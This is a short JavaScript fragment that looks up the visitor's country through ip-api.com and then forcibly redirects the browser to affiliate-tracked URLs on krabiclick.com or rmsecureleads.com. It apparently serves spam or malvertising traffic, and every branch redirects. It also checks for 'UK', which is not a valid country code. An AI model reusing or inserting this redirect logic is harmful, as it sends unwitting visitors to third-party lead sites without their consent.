 var endpoint = 'http://ip-api.com/json/?fields=status,message,countryCode';

  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      var response = JSON.parse(this.responseText);
      if (response.status !== 'success') {
        window.location.replace("https://krabiclick.com/?a=10152&c=3377&s1=");
        return
      }
      // Redirect
      if (response.countryCode == "US") {
        window.location.replace("https://krabiclick.com/?a=10152&c=3377&s1=");
        return
      }
      if (response.countryCode == "UK") {
        window.location.replace("https://krabiclick.com/?a=10152&c=3377&s1=");
        return
      }
      if (response.countryCode == "CA") {
        window.location.replace("https://rmsecureleads.com/?a=10152&c=53792&s1=");
      } else {
        window.location.replace("https://krabiclick.com/?a=10152&c=3377&s1=");
      }
    }
  };
  xhr.open('GET', endpoint, true);
  xhr.send();
